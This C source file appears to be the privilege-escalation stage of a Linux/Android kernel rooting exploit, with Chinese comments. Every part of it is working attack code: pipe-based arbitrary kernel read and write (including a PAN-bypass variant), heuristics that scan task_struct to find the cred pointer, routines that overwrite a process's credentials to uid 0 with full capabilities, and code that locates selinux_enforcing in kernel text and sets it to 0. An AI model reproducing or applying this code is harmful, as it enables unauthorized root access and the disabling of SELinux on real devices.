#include <unistd.h>
#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <fcntl.h>              /* Obtain O_* constant definitions */
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdbool.h>

#include "common.h"
#include "getroot.h"
#include "kallsym.h"

void *mmap_uaddr;
void *mmap_kaddr;


/*
 * 函数: kernel_read
 * 参数: src, 要读数据的地址; dst, 存放数据的地址; len, 拷贝数据长度
 * 返回: 成功返回0，失败返回-1
 * 说明: 读取内核数据
 */
#ifndef CONFIG_BYPASS_PAN
int kernel_read(void *src, void *dst, int len)
{
	int result = -1;
	int pipefd[2];

	if (-1 == pipe(pipefd)) {
		printf(">>> [ERROR] kernel_read open pipe failed, errno: %d, %s\n", errno, strerror(errno));
		return -1;
	}

	errno = 0;
	if (write(pipefd[1], src, len) != len) {
		printf(">>> [ERROR] pipe write failed, errno: %d, %s\n", errno, strerror(errno));
		goto err;
	}

	if(read(pipefd[0], dst, len) != len){
		printf(">>> [ERROR] pipe read failed, errno: %d, %s\n", errno, strerror(errno));
	}

	result = 0;

err:
	close(pipefd[0]);
	close(pipefd[1]);

	return result;
}

#else

/*
 * 函数: kernel_read
 * 参数: src, 要读数据的地址; dst, 存放数据的地址; len, 拷贝数据长度
 * 返回: 成功返回0，失败返回-1
 * 说明: 开启PAN的情况下读取内核数据，其中 src 和 dst 必须是内核地址
 *       mmap_kaddr 和 mmap_uaddr 分别是映射到同一块物理内存的内核地址和用户地址
 */
int kernel_read(void *src, void *dst, int len)
{
	int result = -1;
	int pipefd[2];

	if((!mmap_kaddr || !mmap_uaddr) && ((unsigned long)src < KERNEL_ADDR_START || (unsigned long)dst < KERNEL_ADDR_START)){
		printf(">>> [ERROR] kernel_read failed! mmap_kaddr || mmap_uaddr == NULL\n");
		return -1;
	}

	if (-1 == pipe(pipefd)) {
		printf(">>> [ERROR] kernel_read open pipe failed, errno: %d, %s\n", errno, strerror(errno));
		return -1;
	}

	errno = 0;
	if (write(pipefd[1], src, len) != len) {
		printf(">>> [ERROR] pipe write failed, errno: %d, %s\n", errno, strerror(errno));
		goto err;
	}

	if((unsigned long)dst < KERNEL_ADDR_START){
		if(read(pipefd[0], mmap_kaddr, len) != len){
			printf(">>> [ERROR] pipe read failed, errno: %d, %s\n", errno, strerror(errno));
			goto err;
		}
		memcpy(dst, mmap_uaddr, len);
	}
	else{
		if(read(pipefd[0], dst, len) != len){
			printf(">>> [ERROR] pipe read failed, errno: %d, %s\n", errno, strerror(errno));
			goto err;
		}
	}
	result = 0;

err:
	close(pipefd[0]);
	close(pipefd[1]);

	return result;
}

#endif


/*
 * 函数: kernel_write
 * 参数: src, 存放数据的地址; dst, 要修改的地址; len, 修改数据长度
 * 返回: 成功返回0，失败返回-1
 * 说明: 修改内核数据
 */
#ifndef CONFIG_BYPASS_PAN
int kernel_write(void *dst, void *src, int len)
{
	int result = -1;
	int pipefd[2];

	if(-1 == pipe(pipefd)) {
		printf(">>> [ERROR] kernel_write open pipe failed, errno: %d, %s\n", errno, strerror(errno));
		return -1;
	}

	if(write(pipefd[1], src, len) != len){
		printf(">>> [ERROR] pipe write failed, errno: %d, %s\n", errno, strerror(errno));
		goto err;
	}
	
	if(read(pipefd[0], dst, len) != len) {
		printf(">>> [ERROR] pipe read failed, errno: %d, %s\n", errno, strerror(errno));
		goto err;
	}

	result = 0;
err:
	close(pipefd[0]);
	close(pipefd[1]);

	return result;
}

#else

/*
 * 函数: kernel_write
 * 参数: src, 存放数据的地址; dst, 要修改的地址; len, 修改数据长度
 * 返回: 成功返回0，失败返回-1
 * 说明: 开启PAN的情况下修改内核数据，其中 src 和 dst 必须是内核地址
 *       mmap_kaddr 和 mmap_uaddr 分别是映射到同一块物理内存的内核地址和用户地址
 */
int kernel_write(void *dst, void *src, int len)
{
	int result = -1;
	int pipefd[2];

	if((!mmap_kaddr || !mmap_uaddr) && ((unsigned long)src < KERNEL_ADDR_START || (unsigned long)dst < KERNEL_ADDR_START)){
		printf(">>> [ERROR] kernel_write failed! mmap_kaddr || mmap_uaddr == NULL\n");
		return -1;
	}

	if(-1 == pipe(pipefd)) {
		printf(">>> [ERROR] kernel_write open pipe failed, errno: %d, %s\n", errno, strerror(errno));
		return -1;
	}

	if((unsigned long)src < KERNEL_ADDR_START){
		memcpy(mmap_uaddr, src, len);
		if(write(pipefd[1], mmap_kaddr, len) != len){
			printf(">>> [ERROR] pipe write failed, errno: %d, %s\n", errno, strerror(errno));
			goto err;
		}
	}
	else{
		if(write(pipefd[1], src, len) != len){
			printf(">>> [ERROR] pipe write failed, errno: %d, %s\n", errno, strerror(errno));
			goto err;
		}
	}

	if(read(pipefd[0], dst, len) != len) {
		printf(">>> [ERROR] pipe read failed, errno: %d, %s\n", errno, strerror(errno));
		goto err;
	}

	result = 0;
err:
	close(pipefd[0]);
	close(pipefd[1]);

	return result;
}
#endif

/* 读取一个 unsigned long 数据 */
unsigned long kernel_read_ulong(void* kaddr)
{
	unsigned long data;
	kernel_read(kaddr, &data, sizeof(data));
	return data;
}

/* 读取一个 unsigned int 数据 */
unsigned int kernel_read_uint(void* kaddr)
{
	unsigned int data;
	kernel_read(kaddr, &data, sizeof(data));
	return data;
}

/* 写一个 unsigned long 数据 */
void kernel_write_ulong(void* kaddr, unsigned long data)
{
	kernel_write(kaddr, &data, sizeof(data));
}

/* 写一个 unsigned int 数据 */
void kernel_write_uint(void* kaddr, unsigned int data)
{
	kernel_write(kaddr, &data, sizeof(data));
}


/*
 * 函数: get_sched_class_offset
 * 参数: task, 指向存放 task_struct 结构体数据; len, 搜索长度
 * 返回: 成功返回sched_class字段在task_struct结构体的偏移，失败返回0
 * 说明: 搜索 task_struct 中的 struct sched_class sched_class 字段，返回偏移量
 *       在定位 sched_class 时，由于前面的成员 int prio, static_prio, normal_prio;
 *       等于当前进程的优先级，       因此可以作为标记来搜索
 * 
 * struct task_struct{
 *     ...
 *     int prio, static_prio, normal_prio;
 *     unsigned int rt_priority;
 *     // 进程调度类 指向全局变量 fair_sched_class
 *     const struct sched_class *sched_class;
 *     struct sched_entity se;
 *     struct sched_rt_entity rt;
 *     ...
 * };
 */
int get_sched_class_offset(void *task, int len)
{
	int i;
	int offset = 0;
	unsigned int *step = (unsigned int*)task;
	int count = len / sizeof(int);
	int priority = get_process_priority() + 120;

	for (i = 0; i < count; i++) {
		if (step[i] == priority && (i + 3 < count)) {
			//printf(">>> [%s] 0x%x, 0x%x, 0x%x, 0x%x\n",
			//			__FUNCTION__, step[i], step[i+1], step[i+2], step[i+3]);
			if (step[i+1] == priority && step[i+2] == priority){
				offset = (unsigned long)(&step[i+4]) - (unsigned long)task;
				//printf(">>> [%s] find sched_class offset: 0x%x\n", __FUNCTION__, offset);
				break;
			}
		}
	}

	return offset;
}

/*
 * 函数: get_tasks_offset
 * 参数: task, 指向存放 task_struct 结构体数据; len, 搜索长度
 * 返回: 成功返回tasks字段在task_struct结构体的偏移，失败返回-1
 * 说明: 搜索 task_struct 中的 struct list_head tasks 字段，返回偏移量
 *       在定位 tasks 时，由于下面的成员 pushable_tasks.prio 在手机上总是0x8c，
 *       因此可以作为标记来搜索。同时在prio前后几个字段       均为内核函数指针也可作为判断
 * 
 * struct task_struct{
 *     ...
 *     struct list_head tasks;
 * #ifdef CONFIG_SMP
 *     struct plist_node pushable_tasks;
 *     struct rb_node pushable_dl_tasks;
 * #endif
 *     ...
 * }
 * struct plist_node {
 *     int prio;
 *     struct list_head	 prio_list;
 *     struct list_head	 node_list;
 * };
 */
int get_tasks_offset(void *task, int len)
{
	int i;
	int offset = -1;
	unsigned long *step = task;
	int count = len / sizeof(long);

	for (i = 0; i < count; i++) {
		if (step[i] == 0x8c && (i + 3 < count)) {
			//printf(">>> [%s] 0x%lx, 0x%lx, 0x%lx, 0x%lx, 0x%lx, 0x%lx\n",
			//			__FUNCTION__, step[i-2], step[i-1], step[i], step[i+1], step[i+2], step[i+3]);
			if (step[i-2] & KERNEL_ADDR_START &&
				step[i-1] & KERNEL_ADDR_START &&
				step[i+1] & KERNEL_ADDR_START &&
				step[i+2] & KERNEL_ADDR_START ) {
				offset = (void *)&step[i-2] - task;
				//printf(">>> [%s] find tasks offset: 0x%x\n", __FUNCTION__, offset);
				break;
			}
		}
	}

	return offset;
}

/*
 * 函数: verify_cpu_timer
 * 参数: cpu_timer, 指向存放 struct list_head cpu_timers 结构体数据
 * 返回: 成功返回1，失败返回0
 * 说明: 判断 cpu_timer 是否为空链表
 *       cpu_timer->next == cpu_timer->prev，且 cpu_timer->next 为内核地址
 *       
 */
int verify_cpu_timer(struct list_head* cpu_timer)
{
    if (cpu_timer->next != cpu_timer->prev)
        return 0;

    if ((unsigned long)cpu_timer->next < KERNEL_ADDR_START ||
		(unsigned long)cpu_timer->next > KERNEL_ADDR_END)
        return 0;

    return 1;
}

/*
 * 函数: verify_cred
 * 参数: cred_ptr, 指向存放 struct cred 结构体数据
 * 返回: 成功返回 true, 失败返回 false
 * 说明: 验证 cred_ptr 存放的是否是 cred 结构数据
 */
int verify_cred(unsigned long cred_ptr)
{
	unsigned int uid = 0;

	if (cred_ptr < KERNEL_ADDR_START || kernel_read((void*)(cred_ptr + sizeof(int)), &uid, sizeof(int)))
		return 0;

	return uid == getuid();
}

/*
 * 函数: get_cred_offset
 * 参数: task, 指向存放 task_struct 结构体数据; len, 搜索长度
 * 返回: 成功返回cred字段在task_struct结构体的偏移，失败返回-1
 * 说明: 搜索task_struct中的struct cred字段，返回偏移量
 *       根据cpu_timers中链表为空和cred、real_cred相等作为特征来搜索
 *
 * struct task_struct{
 *     ...
 *     struct list_head cpu_timers[3];
 *     const struct cred __rcu *ptracer_cred; // 可能没有
 *     const struct cred __rcu *real_cred;
 *     const struct cred __rcu *cred;
 *     char comm[TASK_COMM_LEN];
 *     ...
 * }
 */
int get_cred_offset(void *task, int len)
{
	int i;
	int offset = -1;

	for (i = 0; i < len; i += sizeof(void*)) {
		struct task_struct_partial* t = (struct task_struct_partial*)(task + i);
		if (verify_cpu_timer(&t->cpu_timers[0])
			&& verify_cpu_timer(&t->cpu_timers[1])
			&& verify_cpu_timer(&t->cpu_timers[2])
			&& (t->real_cred == t->cred)
			&& ((unsigned long)t->cred > KERNEL_ADDR_START)
			&& (*(unsigned long*)t->comm != 0)
			&& (*(unsigned long*)t->comm < KERNEL_ADDR_START)){
			offset = (void *)&t->cred - task;
			//printf(">>> [%s] find cred offset: 0x%x\n", __FUNCTION__, offset);
			return offset;
		}
	}

	for (i = 0; i < len; i += sizeof(void*)) {
		struct task_struct_partial_ptracer* t = (struct task_struct_partial_ptracer*)(task + i);
		if (verify_cpu_timer(&t->cpu_timers[0])
			&& verify_cpu_timer(&t->cpu_timers[1])
			&& verify_cpu_timer(&t->cpu_timers[2])
			&& (t->ptracer_cred == 0)
			&& (t->real_cred == t->cred)
			&& ((unsigned long)t->cred > KERNEL_ADDR_START)
			&& (*(unsigned long*)t->comm != 0)
			&& (*(unsigned long*)t->comm < KERNEL_ADDR_START)){
			offset = (void *)&t->cred - task;
			//printf(">>> [%s] find cred offset: 0x%x\n", __FUNCTION__, offset);
			return offset;
		}
	}

	printf(">>> [%s] can not find cred offset\n", __FUNCTION__);

	return offset;
}

/*
 * 函数: get_cred_offset_by_name
 * 参数: task, 指向存放 struct task_struct 结构体数据; name, 进程名称
 * 返回: 成功返回cred偏移, 失败返回-1
 * 说明: 通过当前进程名称，获取cred相对task_struct结构偏移
 */
int get_cred_offset_by_name(void* task, int len, char* name)
{
	int i = 0;
    char taskname[TASK_COMM_LEN] = {0,};
	unsigned char* task_ptr = (unsigned char*)task;
    unsigned n = CMP_MIN(strlen(name)+1, TASK_COMM_LEN);
    memcpy(taskname, name, n);

    for (i = 0; i < len; i += sizeof(void*)) {
        if (0 == memcmp(task_ptr+i, taskname, n) && verify_cred(*(unsigned long*)(task_ptr+i-sizeof(void*)))){
            return i-sizeof(void*);
        }
    }

    return -1;
}

/*
 * 函数: find_task_by_task
 * 参数: self_task, 已知task指针; self_name, 已知task名称;
 *       find_task, 存放要查找的task指针; find_name, 要查找的task名称
 * 返回: 成功返回0，失败返回-1
 * 说明: 根据已知task和要查找的task的名称，查找其task指针
 */
int find_task_by_task(void *self_task, char *self_name, void *find_task, char *find_name)
{
	int result = -1;
	int cred_off = -1;
	int tasks_off = -1;
	int len = ONE_PAGE_SIZE;
	struct list_head *tasks = NULL;
	char* comm = NULL;
	void *next_task = self_task;
	void *task = malloc(len);

	if(!task){
		printf(">>> [%s] malloc failed!\n", __FUNCTION__);
		return result;
	}

	if (self_task == NULL || find_task == NULL || find_name == NULL) {
		return result;
	}

	/* 根据内核中的task_struct的双向链表struct list_head tasks来搜索进程 */
	while(1) {
		memset(task, 0 , len);
		/* 读取task_struct结构体内容 */
		if(kernel_read(next_task, task, len) < 0){
			printf(">>> [%s] kernel_read failed! 0x%lx\n", __FUNCTION__, (unsigned long)next_task);
			return result;
		}

		if (tasks_off < 0) {
			/* 搜索task中的struct list_head tasks，返回偏移 */
			tasks_off = get_tasks_offset(task, len);
			if (tasks_off < 0){
				printf(">>> [%s] get_tasks_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] tasks_off = 0x%x\n", __FUNCTION__, tasks_off);
		}
        tasks = task + tasks_off;

		if (cred_off < 0) {
			/* 搜索stask中的struct cred cred，返回偏移 */
			//cred_off = get_cred_offset_by_name(task, len, self_name);
			cred_off = get_cred_offset(task, len);
			if (cred_off < 0){
				printf(">>> [%s] get_cred_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] cred_off = 0x%x\n", __FUNCTION__, cred_off);
		}
		comm = (char*)task + cred_off + sizeof(void*);
		//printf(">>> [%s] task name: %s\n", __FUNCTION__, comm);
		//printf(">>> [%s] tasks->next = %p; tasks->prev = %p\n", __FUNCTION__, tasks->next, tasks->prev);

		/* 根据进程task_struct中的comm字段判断进程 */
		if (strcmp(find_name, comm) == 0) {
			*(unsigned long*)find_task = (unsigned long)next_task;
			result = 0;
			break;
		}
		/* 搜索下一个进程的task_struct */
		next_task = (void *)((char*)tasks->next - tasks_off);
		//printf(">>> [%s] next_task = %p\n", __FUNCTION__, next_task);
		if (next_task == self_task) {
			printf(">>> [%s] can not find task\n", __FUNCTION__);
			break;
		}
	}
	free(task);

	return result;
}

/*
 * 函数: patch_cred_by_task
 * 参数: task, 已知task指针; len, 搜索信息长度; name, 已知task名称;
 * 返回: 成功返回cred偏移，失败返回-1
 * 说明: 修改指定task的cred内容
 */
int patch_cred_by_task(void *task, int len, char *name)
{
	int cred_off = -1;
	char* comm = NULL;
	struct cred cred;
	void *cred_addr = NULL;

	if (name == NULL || task == NULL) {
		return -1;
	}

	cred_off = get_cred_offset_by_name(task, len, name);
	if (cred_off < 0){
		printf(">>> [%s] get_cred_offset failed\n", __FUNCTION__);
		return -1;
	}
	//printf(">>> [%s] cred_off = 0x%x\n", __FUNCTION__, cred_off);

	cred_addr = (void *)(*(unsigned long *)(task + cred_off));
	/* 读取进程cred内容 */
	if (kernel_read(cred_addr, &cred, sizeof(struct cred)) < 0) {
		printf(">>> [%s] kernel_read fail\n", __FUNCTION__);
		return -1;
	}

	cred.uid = 0;
	cred.gid = 0;
	cred.suid = 0;
	cred.sgid = 0;
	cred.euid = 0;
	cred.egid = 0;
	cred.fsuid = 0;
	cred.fsgid = 0;
	cred.cap_inheritable.cap[0] = 0xffffffff;
	cred.cap_inheritable.cap[1] = 0xffffffff;
	cred.cap_permitted.cap[0] = 0xffffffff;
	cred.cap_permitted.cap[1] = 0xffffffff;
	cred.cap_effective.cap[0] = 0xffffffff;
	cred.cap_effective.cap[1] = 0xffffffff;
	cred.cap_bset.cap[0] = 0xffffffff;
	cred.cap_bset.cap[1] = 0xffffffff;
	cred.cap_ambient.cap[0] = 0xffffffff;
	cred.cap_ambient.cap[1] = 0xffffffff;

	/* 修改进程cred内容 */
	if(kernel_write(cred_addr, &cred, sizeof(struct cred)) < 0){
		printf(">>> [%s] kernel_write failed!\n", __FUNCTION__);
		return -1;
	}

	return cred_off;
}

/*
 * 函数: patch_cred_by_init_task
 * 参数: init_task, 已知init_task指针; len, 搜索信息长度; name, 已知task名称;
 * 返回: 成功返回cred偏移，失败返回-1
 * 说明: 修改指定task的cred内容
 */
int patch_cred_by_init_task(void *init_task, char *find_name)
{
	int result = -1;
	int cred_off = -1;
	int tasks_off = -1;
	int len = ONE_PAGE_SIZE;
	struct list_head *tasks = NULL;
	char* comm = NULL;
	void *next_task = init_task;
	void *task = malloc(len);

	if(!task){
		printf(">>> [%s] malloc failed!\n", __FUNCTION__);
		return result;
	}

	if (init_task == NULL || find_name == NULL) {
		return result;
	}

	/* 根据内核中的task_struct的双向链表struct list_head tasks来搜索进程 */
	while(1) {
		memset(task, 0 , len);
		/* 读取task_struct结构体内容 */
		if(kernel_read(next_task, task, len) < 0){
			printf(">>> [%s] kernel_read failed! 0x%lx\n", __FUNCTION__, (unsigned long)next_task);
			return result;
		}

		if (tasks_off < 0) {
			/* 搜索task中的struct list_head tasks，返回偏移 */
			tasks_off = get_tasks_offset(task, len);
			if (tasks_off < 0){
				printf(">>> [%s] get_tasks_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] tasks_off = 0x%x\n", __FUNCTION__, tasks_off);
		}
        tasks = task + tasks_off;

		if (cred_off < 0) {
			/* 搜索stask中的struct cred cred，返回偏移 */
			//cred_off = get_cred_offset_by_name(task, len, self_name);
			cred_off = get_cred_offset(task, len);
			if (cred_off < 0){
				printf(">>> [%s] get_cred_offset failed\n", __FUNCTION__);
				break;
			}
			//printf(">>> [%s] cred_off = 0x%x\n", __FUNCTION__, cred_off);
		}
		comm = (char*)task + cred_off + sizeof(void*);
		//printf(">>> [%s] task name: %s\n", __FUNCTION__, comm);
		//printf(">>> [%s] tasks->next = %p; tasks->prev = %p\n", __FUNCTION__, tasks->next, tasks->prev);

		/* 根据进程task_struct中的comm字段判断进程 */
		if (strcmp(find_name, comm) == 0) {
			//*(unsigned long*)find_task = (unsigned long)next_task;
			void *cred_addr = (void *)(*(unsigned long *)(task + cred_off));
			struct cred cred;
			/* 读取进程cred内容 */
			if (kernel_read(cred_addr, &cred, sizeof(struct cred)) < 0) {
				printf(" kernel_read fail\n");
				break;
			}

			cred.uid = 0;
			cred.gid = 0;
			cred.suid = 0;
			cred.sgid = 0;
			cred.euid = 0;
			cred.egid = 0;
			cred.fsuid = 0;
			cred.fsgid = 0;

			cred.cap_inheritable.cap[0] = 0xffffffff;
			cred.cap_inheritable.cap[1] = 0xffffffff;
			cred.cap_permitted.cap[0] = 0xffffffff;
			cred.cap_permitted.cap[1] = 0xffffffff;
			cred.cap_effective.cap[0] = 0xffffffff;
			cred.cap_effective.cap[1] = 0xffffffff;
			cred.cap_bset.cap[0] = 0xffffffff;
			cred.cap_bset.cap[1] = 0xffffffff;

			/* 修改进程cred内容 */
			if(kernel_write(cred_addr, &cred, sizeof(struct cred)) < 0){
				printf("   kernel_write failed!\n");
			}
			result = 0;
			break;
		}
		/* 搜索下一个进程的task_struct */
		next_task = (void *)((char*)tasks->next - tasks_off);
		//printf(">>> [%s] next_task = %p\n", __FUNCTION__, next_task);
		if (next_task == init_task) {
			printf(">>> [%s] can not find task\n", __FUNCTION__);
			break;
		}
	}
	free(task);

	return result;
}

#ifdef CONFIG_ARCH_ARM64
/*
 * [arm64]
 */
unsigned long find_selinux_enforcing_by_comshic(void* text, int size, unsigned long kaddr)
{
	unsigned int *insn_ptr, insn;
	unsigned long start;
	unsigned int *adrp, *cmp, *beq;
	int imm, shift;
	int reg1, reg2;
	unsigned long addr;
	unsigned low, high;

	adrp = cmp = beq = NULL;
	start = kaddr;

	insn_ptr = (unsigned int *)text;
	unsigned int adrpOffset = 0;

	while ((unsigned long)insn_ptr < (unsigned long)text + size) {
		insn = *insn_ptr;
		//printf("insn = 0x%08x \n", insn);
		if (((insn >> 24) & 0x9f) == 0x90) {
			// adrp
			//printf("get adrp \n");
			adrp = insn_ptr;
			adrpOffset = (unsigned long)insn_ptr - (unsigned long)text;
		}
		else if ((insn >> 24) == 0x6b) {
			// cmp
			 //printf("get cmp \n");
			cmp = insn_ptr;
			if (adrp != NULL) {
				break;
			}
		}
		insn_ptr++;
	}

	// adrp 
	insn_ptr = adrp;
	reg1 = (*adrp & 0x1f);
	low = (*adrp >> 29) & 0x3;
	high = (*adrp >> 5) & 0x7ffff;
	bool indirect = false;

	addr = ((unsigned long)((start + adrpOffset) & ~0xfff)) + (((high << 2) | low) << 12);

	while (insn_ptr < cmp) {
		insn = *insn_ptr;
		 //printf("insn = 0x%08x \n", insn);
		reg2 = (insn >> 5) & 0x1f;
		if ((insn >> 22) == 0x3e5 && reg2 == reg1) {
			// ldr x0
			indirect = true;
			imm = ((insn >> 10) & 0xfff) * 8;
			addr += imm;
		}
		else if ((insn >> 22) == 0x2e5 && reg2 == reg1) {
			// ldr w0
			imm = ((insn >> 10) & 0xfff) * 4;
			addr += imm;

			if (!indirect) {
				//selinux_enforcing_address = addr;
				printf("    find selinux_enforcing_address = 0x%lx\n", addr);
				break;
			}
			else {
				//kernel_read_pan((char*)addr, (char*)&selinux_enforcing_address, sizeof(unsigned long));
				printf("    lookup selinux_enforcing_address = 0x%lx\n", addr);
				break;
			}

		}
		insn_ptr++;
	}

	return addr;
}

unsigned long find_selinux_enforcing_by_selre(void* text, int size, unsigned long kaddr)
{

	return 0;
}
#endif


#ifdef CONFIG_ARCH_X86_64
unsigned long find_selinux_enforcing_by_comshic(void* text, int size, unsigned long kaddr)
{

	return 0;
}


unsigned long find_selinux_enforcing_by_selre(void* text, int size, unsigned long kaddr)
{
	int i;
	unsigned char* chr_ptr = text;
	unsigned int*  int_ptr = NULL;
	unsigned long selinux_enforcing = 0;

	/* 解析内核代码找到 selinux_enforcing 地址 */
	for(i = 0; i < size; i++){
		//printf("    >>> %x\n", *chr_ptr);
		if((unsigned int)(*chr_ptr) == 0x8b){
			chr_ptr++;
			if((int)(*chr_ptr) == 0x0d){
				chr_ptr++;
				int_ptr = (unsigned int*)chr_ptr;
				selinux_enforcing = (unsigned long)(*int_ptr) + kaddr + i + 6;
				//printf("    0x%x, 0x%lx\n", *int_ptr, selinux_enforcing);
				break;
			}
		}
		chr_ptr++;
	}

	return selinux_enforcing;
}
#endif

/*
 * 函数: patch_selinux
 * 参数: kaddr, selinux_enforcing 变量的地址
 * 返回: 成功返回0，失败返回-1
 * 说明: 通过设置 selinux_enforcing = 0 来关闭selinux
 */
int patch_selinux(void *kaddr)
{
	int selinux_enforcing = 0;

	if (kaddr == NULL) {
		printf("    selinux_enforcing is NULL\n");
		return -1;
	}

	if (kernel_write(kaddr, &selinux_enforcing, sizeof(int)) < 0) {
		printf("    kernel_write fail\n");
		return -1;
	}

	return 0;
}
